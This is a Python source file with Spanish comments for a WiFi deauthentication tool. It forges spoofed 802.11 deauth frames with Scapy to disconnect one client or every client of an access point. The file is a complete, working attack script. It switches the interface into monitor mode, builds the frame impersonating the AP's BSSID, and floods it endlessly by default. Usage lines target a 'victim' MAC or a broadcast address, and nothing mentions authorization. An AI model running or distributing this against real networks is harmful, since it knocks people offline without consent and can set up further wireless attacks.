"""
╔══════════════════════════════════════════════════════════════════╗
║              DroidNet Deauther — 802.11 Deauth Module            ║
║──────────────────────────────────────────────────────────────────║
║  Descripción:                                                    ║
║  Módulo de desautenticación WiFi 802.11. Envía frames            ║
║  Deauth forjados a un cliente específico o a todos los           ║
║  clientes de un AP (broadcast), forzando la desconexión          ║
║  de la red WiFi objetivo.                                        ║
║                                                                  ║
║  ⚠ Limitación en Android:                                        ║
║  Este módulo requiere que la interfaz WiFi soporte modo          ║
║  monitor e inyección de paquetes. La mayoría de chips            ║
║  WiFi integrados en Android NO tienen esta capacidad.            ║
║  Opciones recomendadas:                                          ║
║    · Alfa AWUS036ACH conectado por OTG                           ║
║    · Ejecutar desde Raspberry Pi o PC con Kali                   ║
║    · ESP8266 con firmware Deauther (standalone, sin PC)          ║
║                                                                  ║
║  Mecanismo de ataque:                                            ║
║  El estándar 802.11 define frames de Management, entre ellos     ║
║  el Deauthentication frame (tipo 0xC0). Al recibirlo, el         ║
║  cliente asume que el AP lo ha desconectado y abandona la        ║
║  sesión. Scapy permite forjar estos frames con cualquier         ║
║  dirección MAC de origen, incluyendo el BSSID real del AP.       ║
║                                                                  ║
║  Nota WPA3:                                                      ║
║  WPA3 implementa Management Frame Protection (MFP/802.11w)       ║
║  que autentica los frames de management. Este ataque no          ║
║  funciona contra redes WPA3 con MFP activo.                      ║
╚══════════════════════════════════════════════════════════════════╝
"""

# ── Stdlib ────────────────────────────────────────────────────────
import sys        # Para sys.argv y sys.exit()
import os         # Para os.path y utilidades de sistema
import time       # Para time.sleep() durante la activación de monitor mode
import subprocess # Para ejecutar comandos de red sin shell injection

# ── Terceros ──────────────────────────────────────────────────────
from rich import print as rprint  # Print con markup de colores Rich

# ── Módulos internos ──────────────────────────────────────────────
from platform_utils import check_root

# ── Importación condicional de Scapy ─────────────────────────────
# Scapy puede no estar instalado o no funcionar en Android.
# Usamos un flag SCAPY_OK para manejar esto con gracia en runtime
# en lugar de crashear al importar el módulo.
try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ── Constante: dirección MAC de broadcast WiFi ───────────────────
# ff:ff:ff:ff:ff:ff → todos los dispositivos en el medio
# Usada para deauth masivo: expulsa a TODOS los clientes del AP
BROADCAST = "ff:ff:ff:ff:ff:ff"


#  MÓDULO VERIFICACIÓN: Estado de la interfaz WiFi

def check_monitor_mode(iface):
    """
    Verifica si una interfaz de red está en modo monitor
    leyendo su tipo desde el sistema de archivos virtual del kernel.

    El kernel Linux expone el tipo de interfaz en:
    /sys/class/net/<iface>/type

    Valores relevantes:
        1   → Ethernet (modo managed normal)
        803 → IEEE 802.11 monitor mode ← lo que necesitamos

    Este método es más confiable que parsear la salida de `iwconfig`
    porque no depende del formato de texto de herramientas externas.

    Args:
        iface (str): Nombre de la interfaz (ej: wlan0, wlan0mon)

    Returns:
        bool: True si está en monitor mode, False en cualquier otro caso.
    """
    try:
        with open(f"/sys/class/net/{iface}/type") as f:
            return f.read().strip() == "803"
    except Exception:
        # Si el archivo no existe, la interfaz no existe o no es WiFi
        return False


#  MÓDULO CONFIGURACIÓN: Activación de modo monitor

def enable_monitor(iface):
    """
    Intenta activar el modo monitor en la interfaz especificada
    usando las herramientas `ip` e `iw` del sistema.

    Secuencia de comandos:
    1. ip link set <iface> down    → Baja la interfaz (necesario para cambiar modo)
    2. iw dev <iface> set type monitor → Cambia al modo monitor
    3. ip link set <iface> up      → Levanta la interfaz en el nuevo modo
    4. sleep(1)                    → Espera a que el kernel aplique el cambio
    5. check_monitor_mode()        → Verifica que el cambio fue exitoso

    Alternativa con aircrack-ng:
    Si iw no funciona, se puede usar: airmon-ng start <iface>
    que crea una nueva interfaz con sufijo "mon" (ej: wlan0mon).

    ⚠ En Android: aunque tengamos root, si el driver del chip
    no implementa monitor mode en su firmware, este comando
    ejecutará sin error pero check_monitor_mode() devolverá False.

    Args:
        iface (str): Nombre de la interfaz a configurar.

    Returns:
        bool: True si el modo monitor se activó correctamente.
    """
    rprint(f"[yellow][!][/yellow] Intentando activar monitor mode en {iface}...")

    subprocess.run(['ip', 'link', 'set', iface, 'down'], capture_output=True)
    subprocess.run(['iw', 'dev', iface, 'set', 'type', 'monitor'], capture_output=True)
    subprocess.run(['ip', 'link', 'set', iface, 'up'], capture_output=True)
    time.sleep(1)  # Damos tiempo al kernel para aplicar el cambio

    return check_monitor_mode(iface)


#  MÓDULO CONSTRUCCIÓN: Forjado del frame 802.11 Deauth

def build_deauth(target_mac, bssid, reason=7):
    """
    Construye el frame de Deautenticación 802.11 usando Scapy.

    Estructura del frame (capas Scapy):
    ┌──────────────────────────────────────────────────────┐
    │ RadioTap()                                           │
    │   → Header de radiotap para inyección de paquetes    │
    │   → Necesario para que la tarjeta WiFi lo transmita  │
    ├──────────────────────────────────────────────────────┤
    │ Dot11(addr1, addr2, addr3)                           │
    │   → addr1: MAC destino (víctima o broadcast)         │
    │   → addr2: MAC origen  (suplantamos al AP = bssid)   │
    │   → addr3: BSSID del AP                              │
    ├──────────────────────────────────────────────────────┤
    │ Dot11Deauth(reason=7)                                │
    │   → Reason code del frame de deauth                  │
    │   → reason=7: "Class 3 frame from unassociated STA"  │
    └──────────────────────────────────────────────────────┘

    Reason codes comunes del estándar 802.11:
        1  → Unspecified reason
        2  → Previous authentication no longer valid
        3  → Deauthenticated because sending STA is leaving
        6  → Class 2 frame received from nonauthenticated STA
        7  → Class 3 frame received from nonassociated STA ← default
        8  → Disassociated because sending STA is leaving BSS

    El reason 7 es el más usado en herramientas de auditoría
    porque es el que genera un AP legítimo cuando hay inconsistencia
    de estado — parece más orgánico en los logs.

    Args:
        target_mac (str): MAC del cliente a desconectar (o BROADCAST)
        bssid      (str): MAC del AP objetivo (lo suplantamos como origen)
        reason     (int): Reason code del frame (default: 7)

    Returns:
        Scapy packet: Frame listo para ser enviado con sendp()
    """
    frame = (
        RadioTap() /
        Dot11(addr1=target_mac, addr2=bssid, addr3=bssid) /
        Dot11Deauth(reason=reason)
    )
    return frame


#  CORE: Ataque de desautenticación

def deauth_target(target_mac, bssid, iface, count=0, interval=0.1):
    """
    Orquesta el ataque de desautenticación completo.

    Flujo:
    1. Verifica disponibilidad de Scapy
    2. Verifica privilegios root
    3. Verifica/activa modo monitor en la interfaz
    4. Construye el frame Deauth
    5. Envía el frame en bucle hasta count o Ctrl+C

    Modos de operación:
    - count=0 (default) → bucle infinito hasta Ctrl+C
    - count=N           → envía exactamente N frames y termina

    Modo broadcast vs dirigido:
    - target_mac específica → desconecta solo ese cliente del AP
    - target_mac=BROADCAST  → desconecta a TODOS los clientes del AP
      (útil cuando no conoces la MAC de la víctima pero sí el BSSID)

    sendp() vs send():
    - send()  → capa 3, usa el stack de red del OS
    - sendp() → capa 2, envía el frame raw directamente
      por la interfaz. Obligatorio para frames 802.11.

    Args:
        target_mac (str): MAC del objetivo o BROADCAST
        bssid      (str): MAC del AP (BSSID)
        iface      (str): Interfaz en modo monitor (ej: wlan0mon)
        count      (int): Número de frames a enviar (0 = infinito)
        interval   (float): Segundos entre frames (default: 0.1s = 10fps)
    """
    # Guard: Scapy es indispensable para este módulo
    if not SCAPY_OK:
        rprint("[red][✗] Scapy no instalado. pip install scapy[/red]")
        return

    # Guard: raw sockets requieren root
    if not check_root():
        rprint("[red][✗] Necesitas root.[/red]")
        return

    # ── Verificación y activación de monitor mode ─────────────────
    if not check_monitor_mode(iface):
        rprint(f"[yellow][!][/yellow] {iface} no está en monitor mode.")
        if not enable_monitor(iface):
            # El chip no soporta monitor mode — informamos alternativas
            rprint(f"[bold red][✗] No se pudo activar monitor mode en {iface}.[/bold red]")
            rprint("[dim]En Android: tu chip WiFi probablemente no soporta esto.")
            rprint("Solución: Alfa AWUS036ACH por OTG, o corre esto desde una RPi/Kali.[/dim]")
            return

    # ── Construcción del frame ────────────────────────────────────
    frame = build_deauth(target_mac, bssid)

    # Display amigable para modo broadcast
    target_display = "BROADCAST (todos)" if target_mac == BROADCAST else target_mac

    rprint(f"\n[bold red][☠][/bold red] Deauth iniciado")
    rprint(f"  Objetivo  : [cyan]{target_display}[/cyan]")
    rprint(f"  AP (BSSID): [cyan]{bssid}[/cyan]")
    rprint(f"  Interfaz  : [cyan]{iface}[/cyan]")
    rprint(f"  Ctrl+C para detener.\n")

    # ── Bucle de envío ────────────────────────────────────────────
    sent = 0
    try:
        # count=0 → condición siempre verdadera (bucle infinito)
        # count=N → se detiene al llegar a N frames
        while count == 0 or sent < count:
            sendp(frame, iface=iface, verbose=False, inter=interval)
            sent += 1
            # \r sobreescribe la línea en lugar de hacer scroll — más limpio en móvil
            rprint(f"  [dim][→] Frames enviados: {sent}[/dim]", end="\r")

    except KeyboardInterrupt:
        rprint(f"\n[bold yellow][!][/bold yellow] Detenido. {sent} frames en total.")


#  ENTRYPOINT

if __name__ == "__main__":
    """
    Uso:
        python deauther.py <MAC_VICTIMA|broadcast> <BSSID_AP> <INTERFAZ>

    Ejemplos:
        # Desconectar un cliente específico:
        python deauther.py A1:B2:C3:D4:E5:F6 AA:BB:CC:DD:EE:FF wlan0mon

        # Desconectar TODOS los clientes del AP:
        python deauther.py broadcast AA:BB:CC:DD:EE:FF wlan0mon

    Obtener BSSID del AP objetivo:
        sudo iw dev wlan0 scan | grep -E "SSID|BSS"
        # O con airodump-ng: sudo airodump-ng wlan0mon

    Requisitos:
        - Scapy instalado: pip install scapy
        - Root activo
        - Interfaz WiFi con soporte de monitor mode e inyección
    """

    # Guard: necesitamos los 3 argumentos obligatorios
    if len(sys.argv) < 4:
        rprint("[yellow]Uso: python deauther.py <MAC_VICTIMA|broadcast> <BSSID_AP> <INTERFAZ>[/yellow]")
        rprint("[dim]Ejemplo:   python deauther.py A1:B2:C3:D4:E5:F6 AA:BB:CC:DD:EE:FF wlan0mon[/dim]")
        rprint("[dim]Broadcast: python deauther.py broadcast AA:BB:CC:DD:EE:FF wlan0mon[/dim]")
        sys.exit(1)

    # Si el primer argumento es "broadcast", usamos la MAC de broadcast 802.11
    # En cualquier otro caso, asumimos que es una MAC específica
    target = BROADCAST if sys.argv[1].lower() == "broadcast" else sys.argv[1]
    bssid  = sys.argv[2]
    iface  = sys.argv[3]

    deauth_target(target, bssid, iface)
